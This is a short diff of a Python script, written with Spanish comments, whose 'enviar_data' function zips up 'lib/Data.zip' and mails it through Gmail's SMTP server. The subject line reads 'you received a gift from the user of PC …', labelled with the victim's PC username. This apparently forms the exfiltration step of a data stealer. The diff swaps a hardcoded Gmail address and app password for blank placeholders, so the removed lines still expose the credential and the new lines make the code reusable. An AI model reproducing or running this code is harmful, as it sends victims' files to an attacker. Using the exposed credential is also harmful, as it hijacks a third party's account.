@@ -24,8 +24,8 @@ def enviar_data():
     archivo = "lib/Data.zip"
     SMTP_SERVER = 'smtp.gmail.com'
     SMTP_PORT = 587
-    gmail_username = 'notificaciones.netaplication@gmail.com'
-    gmail_password = 'wfosikbmcxfkexuo'
+    gmail_username = '' #agregar el correo remitente
+    gmail_password = '' # key del correo remitente
     # Crear objeto SMTP y establecer conexión
     smtp = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
     smtp.starttls()
@@ -38,7 +38,7 @@ def enviar_data():
 
     # Configurar remitente, destinatario y asunto del correo
     msg['From'] = gmail_username
-    msg['To'] = 'notificaciones.netaplication@gmail.com'
+    msg['To'] = '' #aqui agrega el correo donde se enviara
     msg['Subject'] = f"Acabas de recibir un gift desde el usuario del pc {usuario_pc}, abrelo"
     # Agregar el cuerpo del mensaje
     mensaje = f"Acabas de recibir un gift desde el usuario del pc {usuario_pc}, abrelo"
